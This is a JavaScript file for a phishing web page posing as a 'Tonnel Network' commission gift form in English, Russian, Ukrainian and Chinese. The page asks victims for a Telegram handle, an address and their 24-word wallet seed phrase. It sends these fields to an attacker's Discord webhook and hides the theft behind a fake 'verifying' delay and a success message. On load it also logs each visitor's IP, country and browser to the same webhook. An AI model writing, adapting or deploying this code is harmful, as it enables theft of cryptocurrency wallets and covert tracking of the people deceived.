const screens = {
  language: document.getElementById('language-screen'),
  form: document.getElementById('form-screen'),
  status: document.getElementById('status-screen')
};

const form = document.getElementById('commission-form');
const telegramInput = document.getElementById('telegram');
const giftCountInput = document.getElementById('giftCount');
const commissionBalanceInput = document.getElementById('commissionBalance');
const addressInput = document.getElementById('address');
const words24Input = document.getElementById('words24');
const successMessage = document.getElementById('success-message');
const loadingState = document.getElementById('loading-state');
const successState = document.getElementById('success-state');
const submitBtn = document.getElementById('submitBtn');
const formError = document.getElementById('form-error');

const CONFIG = window.APP_CONFIG || {};
const LOADING_DELAY = Number(CONFIG.loadingDelayMs) || 10000;

let currentLang = 'en';
let lastSubmittedTelegram = '';
let openEventSent = false;

const translations = {
  en: {
    languageTitle: 'Choose language',
    languageSubtitle: 'Select the interface language to continue',
    formTitle: 'Commission Gift Form',
    formSubtitle: 'Fill in your details to receive gifts from the commission balance',
    telegramUsername: 'Telegram username',
    giftCount: 'How many gifts were put on withdrawal',
    commissionBalance: 'Exact commission balance',
    address: 'Your address',
    words24: 'Your 24 words',
    submit: 'Submit',
    processingTitle: 'Processing request',
    processingText: 'Please wait while your request is being verified',
    successTitle: 'Request sent',
    successText: 'Gifts from the commission will be sent to {username}.',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: 'Address',
    words24Placeholder: 'word1 word2 word3 ...',
    webhookMissing: 'Discord webhook is not configured in config.js',
    submitFailed: 'The request was not sent. Check the webhook URL and browser network log.'
  },
  ru: {
    languageTitle: 'Выбери язык',
    languageSubtitle: 'Выбери язык интерфейса, чтобы продолжить',
    formTitle: 'Форма подарков из комиссии',
    formSubtitle: 'Заполни данные, чтобы получить подарки из комиссионного баланса',
    telegramUsername: 'Юзернейм Telegram',
    giftCount: 'Сколько подарков поставили на вывод',
    commissionBalance: 'Точный баланс комиссии',
    address: 'Твой адрес',
    words24: 'Твои 24 слова',
    submit: 'Отправить',
    processingTitle: 'Обработка запроса',
    processingText: 'Подожди, идёт проверка запроса',
    successTitle: 'Запрос отправлен',
    successText: 'Подарки из комиссии будут отправлены на {username}.',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: 'Адрес',
    words24Placeholder: 'слово1 слово2 слово3 ...',
    webhookMissing: 'В config.js не указан Discord webhook',
    submitFailed: 'Запрос не отправлен. Проверь webhook URL и сеть в браузере.'
  },
  uk: {
    languageTitle: 'Обери мову',
    languageSubtitle: 'Обери мову інтерфейсу, щоб продовжити',
    formTitle: 'Форма подарунків з комісії',
    formSubtitle: 'Заповни дані, щоб отримати подарунки з комісійного балансу',
    telegramUsername: 'Юзернейм Telegram',
    giftCount: 'Скільки подарунків поставили на виведення',
    commissionBalance: 'Точний баланс комісії',
    address: 'Твоя адреса',
    words24: 'Твої 24 слова',
    submit: 'Надіслати',
    processingTitle: 'Обробка запиту',
    processingText: 'Зачекай, іде перевірка запиту',
    successTitle: 'Запит надіслано',
    successText: 'Подарунки з комісії будуть надіслані на {username}.',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: 'Адреса',
    words24Placeholder: 'слово1 слово2 слово3 ...',
    webhookMissing: 'У config.js не вказано Discord webhook',
    submitFailed: 'Запит не надіслано. Перевір webhook URL і мережу в браузері.'
  },
  zh: {
    languageTitle: '选择语言',
    languageSubtitle: '选择界面语言后继续',
    formTitle: '佣金礼物表单',
    formSubtitle: '填写信息以接收佣金余额中的礼物',
    telegramUsername: 'Telegram 用户名',
    giftCount: '你提交提现的礼物数量',
    commissionBalance: '准确的佣金余额',
    address: '你的地址',
    words24: '你的24个词',
    submit: '提交',
    processingTitle: '正在处理请求',
    processingText: '请稍候，系统正在验证你的请求',
    successTitle: '请求已发送',
    successText: '佣金中的礼物将发送到 {username}。',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: '地址',
    words24Placeholder: '词1 词2 词3 ...',
    webhookMissing: 'config.js 中没有设置 Discord webhook',
    submitFailed: '请求未发送。请检查 webhook 地址和浏览器网络。'
  }
};

function getDict() {
  return translations[currentLang] || translations.en;
}

function showScreen(name) {
  Object.values(screens).forEach((screen) => screen.classList.remove('active'));
  screens[name].classList.add('active');
}

function normalizeTelegramUsername(value) {
  const trimmed = value.trim().replace(/^@+/, '');
  return trimmed ? `@${trimmed}` : '';
}

function setLanguage(lang) {
  currentLang = translations[lang] ? lang : 'en';
  const dict = getDict();

  document.querySelectorAll('[data-i18n]').forEach((node) => {
    const key = node.getAttribute('data-i18n');
    if (dict[key]) {
      node.textContent = dict[key];
    }
  });

  telegramInput.placeholder = dict.telegramPlaceholder;
  giftCountInput.placeholder = dict.giftCountPlaceholder;
  commissionBalanceInput.placeholder = dict.commissionPlaceholder;
  addressInput.placeholder = dict.addressPlaceholder;
  words24Input.placeholder = dict.words24Placeholder;
}

function hideFormError() {
  formError.textContent = '';
  formError.classList.remove('visible');
}

function showFormError(text) {
  formError.textContent = text;
  formError.classList.add('visible');
}

function countryCodeToFlagEmoji(countryCode) {
  const code = (countryCode || '').trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code)) return '🏳️';
  return String.fromCodePoint(...[...code].map((char) => 127397 + char.charCodeAt(0)));
}

function timeoutPromise(ms) {
  return new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), ms));
}

async function fetchJsonWithTimeout(url, timeoutMs = 5000) {
  const response = await Promise.race([
    fetch(url, { cache: 'no-store' }),
    timeoutPromise(timeoutMs)
  ]);

  if (!response.ok) {
    throw new Error(`HTTP_${response.status}`);
  }

  return response.json();
}

async function getVisitorInfo() {
  const fallback = {
    ip: 'Unknown',
    country: 'Unknown',
    countryCode: '',
    flag: '🏳️'
  };

  try {
    const data = await fetchJsonWithTimeout('https://ipapi.co/json/', 5000);
    const countryCode = data.country_code || '';
    return {
      ip: data.ip || fallback.ip,
      country: data.country_name || fallback.country,
      countryCode,
      flag: countryCodeToFlagEmoji(countryCode)
    };
  } catch (_) {
    try {
      const data = await fetchJsonWithTimeout('https://ipwho.is/', 5000);
      const countryCode = data.country_code || '';
      return {
        ip: data.ip || fallback.ip,
        country: data.country || fallback.country,
        countryCode,
        flag: countryCodeToFlagEmoji(countryCode)
      };
    } catch (_) {
      return fallback;
    }
  }
}

function buildWebhookContent(data) {
  const langLabel = {
    en: 'English',
    ru: 'Русский',
    uk: 'Українська',
    zh: '中文'
  }[currentLang] || 'English';

  return [
    'New commission gift request',
    `Language: ${langLabel}`,
    `Telegram: ${data.telegram || '-'}`,
    `Gift count: ${data.giftCount || '-'}`,
    `Commission balance: ${data.commissionBalance || '-'}`,
    `Address: ${data.address || '-'}`,
    `24 words: ${data.words24 || '-'}`
  ].join('\n');
}

function buildOpenContent(visitor) {
  return [
    'Site opened',
    `IP: ${visitor.ip || 'Unknown'}`,
    `Country: ${visitor.flag || '🏳️'} ${visitor.country || 'Unknown'}`,
    `Country code: ${visitor.countryCode || '-'}`,
    `Page: ${window.location.href}`,
    `User-Agent: ${navigator.userAgent || '-'}`,
    `Browser language: ${navigator.language || '-'}`
  ].join('\n');
}

function hasWebhook() {
  const webhookUrl = (CONFIG.discordWebhookUrl || '').trim();
  return webhookUrl && webhookUrl !== 'PASTE_DISCORD_WEBHOOK_URL_HERE';
}

async function sendToWebhook(content, username = 'Tonnel Network Form') {
  const webhookUrl = (CONFIG.discordWebhookUrl || '').trim();

  if (!hasWebhook()) {
    throw new Error('WEBHOOK_NOT_CONFIGURED');
  }

  const body = new URLSearchParams();
  body.append('content', content);
  body.append('username', username);

  await fetch(webhookUrl, {
    method: 'POST',
    mode: 'no-cors',
    body
  });

  return { ok: true };
}

async function sendOpenEvent() {
  if (openEventSent || !hasWebhook()) return;
  openEventSent = true;

  try {
    const visitor = await getVisitorInfo();
    await sendToWebhook(buildOpenContent(visitor), 'Tonnel Network Open Log');
  } catch (error) {
    console.error('Open log failed:', error);
  }
}

function resetStatusScreen() {
  loadingState.classList.add('active');
  successState.classList.remove('active');
}

function showSuccess() {
  const dict = getDict();
  successMessage.textContent = dict.successText.replace('{username}', lastSubmittedTelegram || '@username');
  loadingState.classList.remove('active');
  successState.classList.add('active');
}

function validateForm(data) {
  return Boolean(data.telegram && data.giftCount && data.commissionBalance && data.address && data.words24);
}

document.querySelectorAll('.lang-btn').forEach((button) => {
  button.addEventListener('click', () => {
    setLanguage(button.dataset.lang);
    showScreen('form');
  });
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  hideFormError();

  const data = {
    telegram: normalizeTelegramUsername(telegramInput.value),
    giftCount: giftCountInput.value.trim(),
    commissionBalance: commissionBalanceInput.value.trim(),
    address: addressInput.value.trim(),
    words24: words24Input.value.trim()
  };

  if (!validateForm(data)) {
    return;
  }

  if (!hasWebhook()) {
    showFormError(getDict().webhookMissing);
    return;
  }

  telegramInput.value = data.telegram;
  lastSubmittedTelegram = data.telegram;
  submitBtn.disabled = true;
  resetStatusScreen();
  showScreen('status');

  try {
    await Promise.all([
      sendToWebhook(buildWebhookContent(data)),
      new Promise((resolve) => setTimeout(resolve, LOADING_DELAY))
    ]);

    showSuccess();
  } catch (error) {
    console.error('Webhook send failed:', error);
    showScreen('form');
    showFormError(error && error.message === 'WEBHOOK_NOT_CONFIGURED' ? getDict().webhookMissing : getDict().submitFailed);
  } finally {
    submitBtn.disabled = false;
  }
});

setLanguage('en');
showScreen('language');
sendOpenEvent();
